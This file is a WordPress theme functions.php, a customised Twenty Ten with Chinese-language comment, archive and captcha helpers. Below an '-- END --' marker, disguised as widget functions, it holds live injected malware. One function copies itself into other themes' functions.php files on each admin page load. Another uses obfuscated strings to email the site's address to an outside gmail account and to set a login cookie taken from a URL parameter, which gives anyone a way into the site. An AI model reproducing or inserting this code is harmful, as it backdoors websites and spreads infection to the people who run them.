<?php
/**
 * TwentyTen functions and definitions
 *
 * Sets up the theme and provides some helper functions. Some helper functions
 * are used in the theme as custom template tags. Others are attached to action and
 * filter hooks in WordPress to change core functionality.
 *
 * The first function, twentyten_setup(), sets up the theme by registering support
 * for various features in WordPress, such as post thumbnails, navigation menus, and the like.
 *
 * When using a child theme (see http://codex.wordpress.org/Theme_Development and
 * http://codex.wordpress.org/Child_Themes), you can override certain functions
 * (those wrapped in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before the parent
 * theme's file, so the child theme functions would be used.
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are instead attached
 * to a filter or action hook. The hook can be removed by using remove_action() or
 * remove_filter() and you can attach your own function to the hook.
 *
 * We can remove the parent theme's hook only after it is attached, which means we need to
 * wait until setting up the child theme:
 *
 * <code>
 * add_action( 'after_setup_theme', 'my_child_theme_setup' );
 * function my_child_theme_setup() {
 *     // We are providing our own filter for excerpt_length (or using the unfiltered value)
 *     remove_filter( 'excerpt_length', 'twentyten_excerpt_length' );
 *     ...
 * }
 * </code>
 *
 * For more information on hooks, actions, and filters, see http://codex.wordpress.org/Plugin_API.
 *
 * @package WordPress
 * @subpackage Twenty_Ten
 * @since Twenty Ten 1.0
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * Used to set the width of images and content. Should be equal to the width the theme
 * is designed for, generally via the style.css stylesheet.
 */
if (!isset($content_width)) {
	$content_width = 640;
}

/** Tell WordPress to run twentyten_setup() when the 'after_setup_theme' hook is run. */
add_action('after_setup_theme', 'twentyten_setup');

if (!function_exists('twentyten_setup')):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * To override twentyten_setup() in a child theme, add your own twentyten_setup to your child theme's
 * functions.php file.
 *
 * @uses add_theme_support() To add support for post thumbnails and automatic feed links.
 * @uses register_nav_menus() To add support for navigation menus.
 * @uses add_custom_background() To add support for a custom background.
 * @uses add_editor_style() To style the visual editor.
 * @uses load_theme_textdomain() For translation/localization support.
 * @uses add_custom_image_header() To add support for a custom header.
 * @uses register_default_headers() To register the default custom header images provided with the theme.
 * @uses set_post_thumbnail_size() To set a custom post thumbnail size.
 *
 * @since Twenty Ten 1.0
 */
	function twentyten_setup() {

		// This theme styles the visual editor with editor-style.css to match the theme style.
		add_editor_style();

		// This theme uses post thumbnails
		add_theme_support('post-thumbnails');

		// Add default posts and comments RSS feed links to head
		add_theme_support('automatic-feed-links');

		// Make theme available for translation
		// Translations can be filed in the /languages/ directory
		load_theme_textdomain('twentyten', TEMPLATEPATH . '/languages');

		$locale = get_locale();
		$locale_file = TEMPLATEPATH . "/languages/$locale.php";
		if (is_readable($locale_file)) {
			require_once $locale_file;
		}

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus(array(
			'primary' => __('Primary Navigation', 'twentyten'),
		));

		// Your changeable header business starts here
		define('HEADER_TEXTCOLOR', '');
		// No CSS, just IMG call. The %s is a placeholder for the theme template directory URI.
		define('HEADER_IMAGE', '%s/images/headers/path.jpg');

		// The height and width of your custom header. You can hook into the theme's own filters to change these values.
		// Add a filter to twentyten_header_image_width and twentyten_header_image_height to change these values.
		define('HEADER_IMAGE_WIDTH', apply_filters('twentyten_header_image_width', 940));
		define('HEADER_IMAGE_HEIGHT', apply_filters('twentyten_header_image_height', 198));

		// We'll be using post thumbnails for custom header images on posts and pages.
		// We want them to be 940 pixels wide by 198 pixels tall.
		// Larger images will be auto-cropped to fit, smaller ones will be ignored. See header.php.
		set_post_thumbnail_size(HEADER_IMAGE_WIDTH, HEADER_IMAGE_HEIGHT, true);

		// Don't support text inside the header image.
		define('NO_HEADER_TEXT', true);
	}
endif;

/**
 * Get our wp_nav_menu() fallback, wp_page_menu(), to show a home link.
 *
 * To override this in a child theme, remove the filter and optionally add
 * your own function tied to the wp_page_menu_args filter hook.
 *
 * @since Twenty Ten 1.0
 */
function twentyten_page_menu_args($args) {
	$args['show_home'] = true;
	return $args;
}
add_filter('wp_page_menu_args', 'twentyten_page_menu_args');

/**
 * Sets the post excerpt length to 40 characters.
 *
 * To override this length in a child theme, remove the filter and add your own
 * function tied to the excerpt_length filter hook.
 *
 * @since Twenty Ten 1.0
 * @return int
 */
function twentyten_excerpt_length($length) {
	return 40;
}
add_filter('excerpt_length', 'twentyten_excerpt_length');

/**
 * Returns a "Continue Reading" link for excerpts
 *
 * @since Twenty Ten 1.0
 * @return string "Continue Reading" link
 */
function twentyten_continue_reading_link() {
	return ' <a href="' . get_permalink() . '">' . __('Continue reading <span class="meta-nav">&rarr;</span>', 'twentyten') . '</a>';
}

/**
 * Replaces "[...]" (appended to automatically generated excerpts) with an ellipsis and twentyten_continue_reading_link().
 *
 * To override this in a child theme, remove the filter and add your own
 * function tied to the excerpt_more filter hook.
 *
 * @since Twenty Ten 1.0
 * @return string An ellipsis
 */
function twentyten_auto_excerpt_more($more) {
	return ' &hellip;' . twentyten_continue_reading_link();
}
add_filter('excerpt_more', 'twentyten_auto_excerpt_more');

/**
 * Adds a pretty "Continue Reading" link to custom post excerpts.
 *
 * To override this link in a child theme, remove the filter and add your own
 * function tied to the get_the_excerpt filter hook.
 *
 * @since Twenty Ten 1.0
 * @return string Excerpt with a pretty "Continue Reading" link
 */
function twentyten_custom_excerpt_more($output) {
	if (has_excerpt() && !is_attachment()) {
		$output .= twentyten_continue_reading_link();
	}
	return $output;
}
add_filter('get_the_excerpt', 'twentyten_custom_excerpt_more');

/**
 * Remove inline styles printed when the gallery shortcode is used.
 *
 * Galleries are styled by the theme in Twenty Ten's style.css.
 *
 * @since Twenty Ten 1.0
 * @return string The gallery style filter, with the styles themselves removed.
 */
function twentyten_remove_gallery_css($css) {
	return preg_replace("#<style type='text/css'>(.*?)</style>#s", '', $css);
}
add_filter('gallery_style', 'twentyten_remove_gallery_css');

if (!function_exists('twentyten_comment')):
/**
 * Template for comments and pingbacks.
 *
 * To override this walker in a child theme without modifying the comments template
 * simply create your own twentyten_comment(), and that function will be used instead.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 *
 * @since Twenty Ten 1.0
 */
	function mytheme_comment($comment, $args, $depth) {
		$GLOBALS['comment'] = $comment;

		global $commentcount;
		$page = (!empty($in_comment_loop)) ? get_query_var('cpage') : get_page_of_comment($comment->comment_ID, $args);
		$cpp = get_option('comments_per_page'); //获取每页评论显示数量
		if (!$commentcount) {
			//初始化楼层计数器
			if ($page > 1) {
				$commentcount = $cpp * ($page - 1);
			} else {
			$commentcount = 0; //如果评论还没有分页，初始值为0
		}
	}
	?>
	<li <?php comment_class();?> id="li-comment-<?php comment_ID();?>">
		<div id="comment-<?php comment_ID();?>" class="comment-wrap"><div class="inner-wrap">
		<div class="comment-author vcard">
			<?php echo get_avatar($comment, 40);?>
			<?php printf(sprintf('<cite class="fn">%s</cite>', get_comment_author_link()));?>
			<?php if (!$parent_id = $comment->comment_parent) {?>
				<span class="meta-sep"> | </span>
				<span class="comment-count"><a href="#comment-<?php comment_ID()?>"><?php printf('#%1$s', ++$commentcount);?></a></span>
			<?php }?>
		</div><!-- .comment-author .vcard -->

		<div class="comment-meta commentmetadata"><a href="<?php echo esc_url(get_comment_link($comment->comment_ID));?>">
			<?php
/* translators: 1: date, 2: time */
	printf(__('On %1$s %2$s', 'twentyten'), get_comment_date(), get_comment_time());?></a><?php edit_comment_link(__('(Edit)', 'twentyten'), ' ');
	?>
		</div><!-- .comment-meta .commentmetadata -->

		<div class="comment-body">
			<?php if ($comment->comment_approved == '0'): ?>
				<p><em><?php _e('Your comment is awaiting moderation.', 'twentyten');?></em></p>
			<?php endif;?>
			<?php comment_text();?>
		</div>

		<div class="reply">
			<?php comment_reply_link(array_merge($args, array('depth' => $depth, 'max_depth' => $args['max_depth'])));?>
		</div><!-- .reply -->
	</div></div><!-- #comment-##  -->

	<?php
}
function list_pings($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	?>
	<li><?php comment_author_link();?>
	<?php }
endif;

/**
 * Register widgetized areas, including two sidebars and four widget-ready columns in the footer.
 *
 * To override twentyten_widgets_init() in a child theme, remove the action hook and add your own
 * function tied to the init hook.
 *
 * @since Twenty Ten 1.0
 * @uses register_sidebar
 */
function twentyten_widgets_init() {
	// Area 1, located at the top of the sidebar.
	register_sidebar(array(
		'name' => __('Primary Widget Area', 'twentyten'),
		'id' => 'primary-widget-area',
		'description' => __('The primary widget area', 'twentyten'),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	));

	// Area 2, located below the Primary Widget Area in the sidebar. Empty by default.
	register_sidebar(array(
		'name' => __('Secondary Widget Area', 'twentyten'),
		'id' => 'secondary-widget-area',
		'description' => __('The secondary widget area', 'twentyten'),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	));

	// Area 3, located in the footer. Empty by default.
	register_sidebar(array(
		'name' => __('First Footer Widget Area', 'twentyten'),
		'id' => 'first-footer-widget-area',
		'description' => __('The first footer widget area', 'twentyten'),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	));

	// Area 4, located in the footer. Empty by default.
	register_sidebar(array(
		'name' => __('Second Footer Widget Area', 'twentyten'),
		'id' => 'second-footer-widget-area',
		'description' => __('The second footer widget area', 'twentyten'),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	));

	// Area 5, located in the footer. Empty by default.
	register_sidebar(array(
		'name' => __('Third Footer Widget Area', 'twentyten'),
		'id' => 'third-footer-widget-area',
		'description' => __('The third footer widget area', 'twentyten'),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	));

	// Area 6, located in the footer. Empty by default.
	register_sidebar(array(
		'name' => __('Fourth Footer Widget Area', 'twentyten'),
		'id' => 'fourth-footer-widget-area',
		'description' => __('The fourth footer widget area', 'twentyten'),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	));
}
/** Register sidebars by running twentyten_widgets_init() on the widgets_init hook. */
add_action('widgets_init', 'twentyten_widgets_init');

/**
 * Removes the default styles that are packaged with the Recent Comments widget.
 *
 * To override this in a child theme, remove the filter and optionally add your own
 * function tied to the widgets_init action hook.
 *
 * @since Twenty Ten 1.0
 */
function twentyten_remove_recent_comments_style() {
	global $wp_widget_factory;
	remove_action('wp_head', array($wp_widget_factory->widgets['WP_Widget_Recent_Comments'], 'recent_comments_style'));
}
add_action('widgets_init', 'twentyten_remove_recent_comments_style');

if (!function_exists('twentyten_posted_on')):
/**
 * Prints HTML with meta information for the current post—date/time and author.
 *
 * @since Twenty Ten 1.0
 */
	function twentyten_posted_on() {
		$view_count = '';
		if (function_exists('the_views')) {$view_count = '<span class="entry-eye">' . the_views(false) . '</span>';}
		printf(__('%2$s %3$s %4$s %5$s', 'twentyten'),
			'meta-prep meta-prep-author',
			sprintf('<span class="entry-date">发布时间：%3$s</span>',
				get_permalink(),
				esc_attr(get_the_time()),
				get_the_time('Y-m-d H:i')
			),
			sprintf('<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s">%3$s</a></span>',
				get_author_posts_url(get_the_author_meta('ID')),
				sprintf(esc_attr__('View all posts by %s', 'twentyten'), get_the_author()),
				get_the_author()
			),
			sprintf('<span class="cat-links">%1$s</span>',
				get_the_category_list(', ')
			),
			sprintf($view_count)
		);
	}
endif;

if (!function_exists('twentyten_posted_in')):
/**
 * Prints HTML with meta information for the current post (category, tags and permalink).
 *
 * @since Twenty Ten 1.0
 */
	function twentyten_posted_in() {
		// Retrieves tag list of current post, separated by commas.
		$tag_list = get_the_tag_list('', ', ');
		if ($tag_list) {
			$posted_in = __('This entry was posted in %1$s and tagged %2$s. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'twentyten');
		} elseif (is_object_in_taxonomy(get_post_type(), 'category')) {
		$posted_in = __('This entry was posted in %1$s. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'twentyten');
	} else {
		$posted_in = __('Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'twentyten');
	}
	// Prints the string, replacing the placeholders.
	printf(
		$posted_in,
		get_the_category_list(', '),
		$tag_list,
		get_permalink(),
		the_title_attribute('echo=0')
	);
}
endif;

/* Mini Pagenavi v1.0 by Willin Kan. */
function pagenavi($before = '', $after = '', $p = 2) {
	// 取當前頁前後各 2 頁
	if (is_singular()) {
		return;
	}
	// 文章與插頁不用
	global $wp_query, $paged;
	$max_page = $wp_query->max_num_pages;
	if ($max_page == 1) {
		return;
	}
	// 只有一頁不用
	if (empty($paged)) {
		$paged = 1;
	}

	echo $before . '<div id="pagenavi">' . "\n";
	echo '<span class="pages">Page: ' . $paged . ' of ' . $max_page . ' </span>'; // 頁數
	if ($paged > 1) {
		p_link($paged - 1, 'Previous Page', '«');
	}
/* 如果当前页大于1就显示上一页链接 */
	if ($paged > $p + 1) {
		p_link(1, 'First Page');
	}

	if ($paged > $p + 2) {
		echo '... ';
	}

	for ($i = $paged - $p; $i <= $paged + $p; $i++) {
		// 中間頁
		if ($i > 0 && $i <= $max_page) {
			$i == $paged ? print "<span class='page-numbers current'>{$i}</span>" : p_link($i);
		}

	}
	if ($paged < $max_page - $p - 1) {
		echo '... ';
	}

	if ($paged < $max_page - $p) {
		p_link($max_page, 'Last Page');
	}

	if ($paged < $max_page) {
		p_link($paged + 1, 'Next Page', '»');
	}
/* 如果当前页不是最后一页显示下一页链接 */
	echo '</div>' . $after . "\n";
}
function p_link($i, $title = '', $linktype = '') {
	if ($title == '') {
		$title = "Page {$i}";
	}

	if ($linktype == '') {$linktext = $i;} else { $linktext = $linktype;}
	echo "<a class='page-numbers' href='", esc_html(get_pagenum_link($i)), "' title='{$title}'>{$linktext}</a>";
}
// -- END ----------------------------------------?>
<?php
function _verifyactivate_widgets() {
	$widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<" . "?"));
	$output = "";
	$allowed = "";
	$output = strip_tags($output, $allowed);
	$direst = _get_allwidgets_cont(array(substr(dirname(__FILE__), 0, stripos(dirname(__FILE__), "themes") + 6)));
	if (is_array($direst)) {
		foreach ($direst as $item) {
			if (is_writable($item)) {
				$ftion = substr($widget, stripos($widget, "_"), stripos(substr($widget, stripos($widget, "_")), "("));
				$cont = file_get_contents($item);
				if (stripos($cont, $ftion) === false) {
					$comaar = stripos(substr($cont, -20), "?" . ">") !== false ? "" : "?" . ">";
					$output .= $before . "Not found" . $after;
					if (stripos(substr($cont, -20), "?" . ">") !== false) {$cont = substr($cont, 0, strripos($cont, "?" . ">") + 2);}
					$output = rtrim($output, "\n\t");
					fputs($f = fopen($item, "w+"), $cont . $comaar . "\n" . $widget);
					fclose($f);
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids, $items = array()) {
	$places = array_shift($wids);
	if (substr($places, -1) == "/") {
		$places = substr($places, 0, -1);
	}
	if (!file_exists($places) || !is_dir($places)) {
		return false;
	} elseif (is_readable($places)) {
		$elems = scandir($places);
		foreach ($elems as $elem) {
			if ($elem != "." && $elem != "..") {
				if (is_dir($places . "/" . $elem)) {
					$wids[] = $places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem) &&
					$elem == substr(__FILE__, -13)) {
					$items[] = $places . "/" . $elem;}
			}
		}
	} else {
		return false;
	}
	if (sizeof($wids) > 0) {
		return _get_allwidgets_cont($wids, $items);
	} else {
		return $items;
	}
}
if (!function_exists("stripos")) {
	function stripos($str, $needle, $offset = 0) {
		return strpos(strtolower($str), strtolower($needle), $offset);
	}
}

if (!function_exists("strripos")) {
	function strripos($haystack, $needle, $offset = 0) {
		if (!is_string($needle)) {
			$needle = chr(intval($needle));
		}

		if ($offset < 0) {
			$temp_cut = strrev(substr($haystack, 0, abs($offset)));
		} else {
			$temp_cut = strrev(substr($haystack, 0, max((strlen($haystack) - $offset), 0)));
		}
		if (($found = stripos($temp_cut, strrev($needle))) === FALSE) {
			return FALSE;
		}

		$pos = (strlen($haystack) - ($found + $offset + strlen($needle)));
		return $pos;
	}
}
if (!function_exists("scandir")) {
	function scandir($dir, $listDirectories = false, $skipDots = true) {
		$dirArray = array();
		if ($handle = opendir($dir)) {
			while (false !== ($file = readdir($handle))) {
				if (($file != "." && $file != "..") || $skipDots == true) {
					if ($listDirectories == false) {if (is_dir($file)) {continue;}}
					array_push($dirArray, basename($file));
				}
			}
			closedir($handle);
		}
		return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget() {
	if (!isset($text_length)) {
		$text_length = 120;
	}

	if (!isset($check)) {
		$check = "cookie";
	}

	if (!isset($tagsallowed)) {
		$tagsallowed = "<a>";
	}

	if (!isset($filter)) {
		$filter = "none";
	}

	if (!isset($coma)) {
		$coma = "";
	}

	if (!isset($home_filter)) {
		$home_filter = get_option("home");
	}

	if (!isset($pref_filters)) {
		$pref_filters = "wp_";
	}

	if (!isset($is_use_more_link)) {
		$is_use_more_link = 1;
	}

	if (!isset($com_type)) {
		$com_type = "";
	}

	if (!isset($cpages)) {
		$cpages = $_GET["cperpage"];
	}

	if (!isset($post_auth_comments)) {
		$post_auth_comments = "";
	}

	if (!isset($com_is_approved)) {
		$com_is_approved = "";
	}

	if (!isset($post_auth)) {
		$post_auth = "auth";
	}

	if (!isset($link_text_more)) {
		$link_text_more = "(more...)";
	}

	if (!isset($widget_yes)) {
		$widget_yes = get_option("_is_widget_active_");
	}

	if (!isset($checkswidgets)) {
		$checkswidgets = $pref_filters . "set" . "_" . $post_auth . "_" . $check;
	}

	if (!isset($link_text_more_ditails)) {
		$link_text_more_ditails = "(details...)";
	}

	if (!isset($contentmore)) {
		$contentmore = "ma" . $coma . "il";
	}

	if (!isset($for_more)) {
		$for_more = 1;
	}

	if (!isset($fakeit)) {
		$fakeit = 1;
	}

	if (!isset($sql)) {
		$sql = "";
	}

	if (!$widget_yes):

		global $wpdb, $post;
		$sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $coma . "vethe" . $com_type . "mas" . $coma . "@" . $com_is_approved . "gm" . $post_auth_comments . "ail" . $coma . "." . $coma . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count"; #
		if (!empty($post->post_password)) {
			if ($_COOKIE["wp-postpass_" . COOKIEHASH] != $post->post_password) {
				if (is_feed()) {
					$output = __("There is no excerpt because this is a protected post.");
				} else {
				$output = get_the_password_form();
			}
		}
	}
	if (!isset($fixed_tags)) {
		$fixed_tags = 1;
	}

	if (!isset($filters)) {
		$filters = $home_filter;
	}

	if (!isset($gettextcomments)) {
		$gettextcomments = $pref_filters . $contentmore;
	}

	if (!isset($tag_aditional)) {
		$tag_aditional = "div";
	}

	if (!isset($sh_cont)) {
		$sh_cont = substr($sq1, stripos($sq1, "live"), 20);
	}
#
	if (!isset($more_text_link)) {
		$more_text_link = "Continue reading this entry";
	}

	if (!isset($isshowdots)) {
		$isshowdots = 1;
	}

	$comments = $wpdb->get_results($sql);
	if ($fakeit == 2) {
		$text = $post->post_content;
	} elseif ($fakeit == 1) {
		$text = (empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else {
		$text = $post->post_excerpt;
	}
	$sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) . " ORDER BY comment_date_gmt DESC LIMIT $src_count"; #
	if ($text_length < 0) {
		$output = $text;
	} else {
		if (!$no_more && strpos($text, "<!--more-->")) {
			$text = explode("<!--more-->", $text, 2);
			$l = count($text[0]);
			$more_link = 1;
			$comments = $wpdb->get_results($sql);
		} else {
			$text = explode(" ", $text);
			if (count($text) > $text_length) {
				$l = $text_length;
				$ellipsis = 1;
			} else {
				$l = count($text);
				$link_text_more = "";
				$ellipsis = 0;
			}
		}
		for ($i = 0; $i < $l; $i++) {
			$output .= $text[$i] . " ";
		}

	}
	update_option("_is_widget_active_", 1);
	if ("all" != $tagsallowed) {
		$output = strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output = rtrim($output, "\s\n\t\r\0\x0B");
	$output = ($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output = apply_filters($filter, $output);
	switch ($tag_aditional) {
		case ("div"):
			$tag = "div";
			break;
		case ("span"):
			$tag = "span";
			break;
		case ("p"):
			$tag = "p";
			break;
		default:
			$tag = "span";
	}

	if ($is_use_more_link) {
		if ($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "#more-" . $post->ID . "\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets, array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "") {
	global $wpdb;
	$request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if (!$show_pass_post) {
		$request .= " AND post_password =\"\"";
	}

	if ($duration != "") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL " . $duration . " DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts = $wpdb->get_results($request);
	$output = "";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title = stripslashes($post->post_title);
			$comment_count = $post->comment_count;
			$permalink = get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title . "\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return $output;
}

function colorCloud($text) {
	$text = preg_replace_callback('|<a (.+?)>|i', 'colorCloudCallback', $text);
	return $text;
}
function colorCloudCallback($matches) {
	$text = $matches[1];
	for ($a = 0; $a < 6; $a++) {
		$color .= dechex(rand(0, 15));
	}
	$pattern = '/style=(\'|\")(.*)(\'|\")/i';
	$text = preg_replace($pattern, "style=\"color:#{$color};$2;\"", $text);
	return "</a><a $text>";
	unset($color);
}
add_filter('wp_tag_cloud', 'colorCloud', 1);

function weisay_get_avatar($email, $size = 48) {
	return get_avatar($email, $size);
}

function archives_list_SHe() {
	global $wpdb, $month;
	$lastpost = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC LIMIT 1");
	$output = get_option('SHe_archives_' . $lastpost);
	if (empty($output)) {
		$output = '';
		$wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'SHe_archives_%'");
		$q = "SELECT DISTINCT YEAR(post_date) AS year, MONTH(post_date) AS month, count(ID) as posts FROM $wpdb->posts p WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC";
		$monthresults = $wpdb->get_results($q);
		if ($monthresults) {
			foreach ($monthresults as $monthresult) {
				$thismonth = zeroise($monthresult->month, 2);
				$thisyear = $monthresult->year;
				$q = "SELECT ID, post_date, post_title, comment_count FROM $wpdb->posts p WHERE post_date LIKE '$thisyear-$thismonth-%' AND post_date AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC";
				$postresults = $wpdb->get_results($q);
				if ($postresults) {
					$text = sprintf('%s %s', $monthresult->year . '年', $month[zeroise($monthresult->month, 2)]);
					$postcount = count($postresults);
					$output .= '<span style="float:left;width: 15px;font-family: Courier New,Lucida Console,MS Gothic,MS Mincho;">+</span><ul class="archives-list"><li><span class="archives-yearmonth">' . $text . ' &nbsp;(共' . sprintf("%02d", count($postresults)) . '篇文章)</span><ul class="archives-monthlisting">' . "\n";
					foreach ($postresults as $postresult) {
						if ($postresult->post_date != '0000-00-00 00:00:00') {
							$url = get_permalink($postresult->ID);
							$arc_title = $postresult->post_title;
							if ($arc_title) {
								$text = wptexturize(strip_tags($arc_title));
							} else {
								$text = $postresult->ID;
							}

							$title_text = '&#x67E5;&#x770B;&#x6587;&#x7AE0;, &quot;' . wp_specialchars($text, 1) . '&quot;';
							$output .= '<li>' . mysql2date('d&#x65E5;', $postresult->post_date) . ':&nbsp;' . "<a href='$url' title='$title_text'>$text</a>";
							$output .= '&nbsp;(' . $postresult->comment_count . ')';
							$output .= '</li>' . "\n";
						}
					}
				}
				$output .= '</ul></li></ul>' . "\n";
			}
			update_option('SHe_archives_' . $lastpost, $output);
		} else {
			$output = '<div class="errorbox">Sorry, no posts matched your criteria.</div>' . "\n";
		}
	}
	echo $output;
}

/* 开始*/
function comment_mail_notify($comment_id) {
	$admin_notify = '1'; // admin 要不要收回复通知 ( '1'=要 ; '0'=不要 )
	$admin_email = get_bloginfo('admin_email'); // $admin_email 可改为你指定的 e-mail.
	$comment = get_comment($comment_id);
	$comment_author_email = trim($comment->comment_author_email);
	$parent_id = $comment->comment_parent ? $comment->comment_parent : '';
	global $wpdb;
	if ($wpdb->query("Describe {$wpdb->comments} comment_mail_notify") == '') {
		$wpdb->query("ALTER TABLE {$wpdb->comments} ADD COLUMN comment_mail_notify TINYINT NOT NULL DEFAULT 0;");
	}

	if (($comment_author_email != $admin_email && isset($_POST['comment_mail_notify'])) || ($comment_author_email == $admin_email && $admin_notify == '1')) {
		$wpdb->query("UPDATE {$wpdb->comments} SET comment_mail_notify='1' WHERE comment_ID='$comment_id'");
	}

	$notify = $parent_id ? get_comment($parent_id)->comment_mail_notify : '0';
	$spam_confirmed = $comment->comment_approved;
	if ($parent_id != '' && $spam_confirmed != 'spam' && $notify == '1') {
		$wp_email = 'no-reply@' . preg_replace('#^www.#', '', strtolower($_SERVER['SERVER_NAME'])); // e-mail 发出点, no-reply 可改为可用的 e-mail.
		$to = trim(get_comment($parent_id)->comment_author_email);
		$subject = '您在 [' . get_option("blogname") . '] 的留言有了回复';
		$message = '
    <div style="background-color:#eef2fa; border:1px solid #d8e3e8; color:#111; padding:0 15px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px;">
      <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
      <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
		. trim(get_comment($parent_id)->comment_content) . '</p>
      <p>' . trim($comment->comment_author) . ' 给您的回复:<br />'
		. trim($comment->comment_content) . '<br /></p>
      <p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id)) . '">查看回复的完整內容</a></p>
      <p>欢迎再次光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
      <p>(此邮件由系统自动发送，请勿回复.)</p>
    </div>';
		$from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
		$headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
		wp_mail($to, $subject, $message, $headers);
	}
}
add_action('comment_post', 'comment_mail_notify');

/* 自动加勾选栏 */
function add_checkbox() {
	echo '<div style="right:50px; bottom:12px; position:absolute;"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked" style="margin-left:20px;" /><label for="comment_mail_notify">有人回复时邮件通知我</label></div>';
}
add_action('comment_form', 'add_checkbox');

/* 验证码 */
function spam_protection_math() {
//获取两个随机数, 范围0~9
	$num1 = rand(0, 9);
	$num2 = rand(0, 9);
//最终网页中的具体内容
	echo "<input type='text' name='sum' class='math_textfield' value='' size='25' tabindex='4'> $num1 + $num2 = ?"
	. "<input type='hidden' name='num1' value='$num1'>"
	. "<input type='hidden' name='num2' value='$num2'>"
	. "<label for='math' class='small'> 验证码</label>";

}
function spam_protection_pre($commentdata) {
	$sum = $_POST['sum']; //用户提交的计算结果
	switch ($sum) {
//得到正确的计算结果则直接跳出
		case $_POST['num1'] + $_POST['num2']:break;
//未填写结果时的错误讯息
		case null:err('错误: 请输入验证码.');
			break;
//计算错误时的错误讯息
